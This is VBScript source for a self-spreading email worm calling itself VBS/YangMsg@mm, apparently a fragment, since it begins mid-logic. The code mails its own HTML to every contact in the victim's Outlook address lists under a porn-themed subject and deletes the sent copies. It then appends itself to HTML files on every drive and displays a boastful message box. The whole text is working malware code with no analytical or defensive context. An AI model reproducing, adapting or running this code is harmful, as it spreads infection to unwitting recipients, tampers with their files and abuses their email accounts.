If OlMsg Is Nothing Then GoTo EndOfWorm
Set WshShell = OlMsg.Session.Application.CreateObject("WScript.Shell")
If WshShell Is Nothing Then GoTo EndOfWorm
If WshShell.RegRead("HKCU\Software\Microsoft\VBS.YangMsg") = "VBS.YangMsg@mm" Then GoTo SkipMailing
Set MSOutlook = OlMsg.Session.Application
Set MapiNs = MSOutlook.GetNameSpace("MAPI")
For Each JM In MapiNs.AddressLists
	For Each JP In JM.AddressEntries
		Set MsgItem = MSOutlook.CreateItem(0)
		MsgItem.Recipients.Add(JP.Name)
		MsgItem.Subject = "Fw: Free Porno XXX Sites!!"
		MsgItem.HtmlBody = Document.Body.OuterHtml
		MsgItem.DeleteAfterSubmit = True
		MsgItem.Send
	Next
Next
WshShell.RegWrite "HKCU\Software\Microsoft\VBS.YangMsg", "VBS.YangMsg@mm"
SkipMailing:
Set FSO = OlMsg.Session.Application.CreateObject("Scripting.FileSystemObject")
For Each ZZ In FSO.Drives
	InfectFiles(ZZ.Path&"\")

Next
MsgBox "You've been slammed by VBS/YangMsg@mm, a wonderful new work by Yang & ESOng."&vbCrLf&"Office XP bites!!  Get used to it!"&vbCrLf&vbCrLf&"VBS/YangMsg@mm is Copyright (c) Yang&ESOng, 2001"&vbCrLf&"Thank you Microsoft / Bill Gatez!  What would this world be without you..."

Sub InfectFiles(pspec)
For Each MS In FSO.GetFolder(pspec).Files
	Ext = UCase(FSO.GetExtensionName(MS.Path))
	If InStr(1, Ext, "HT") > 0 Then
		Set HtmRead = FSO.OpenTextFile(MS.Path)
		fstr = InStr(1, HtmRead.ReadAll, "XPMsg")
		HtmRead.Close
		If fstr = 0 Then
			Set HtmWrite = FSO.OpenTextFile(MS.Path, 8)
			HtmWrite.Write Document.Body.OuterHtml
			HtmWrite.Close
		End If
	End If
Next
End Sub
